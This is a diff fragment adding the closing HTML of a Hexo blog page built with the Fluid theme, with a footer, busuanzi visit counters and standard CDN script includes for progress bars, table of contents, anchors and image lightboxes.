+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
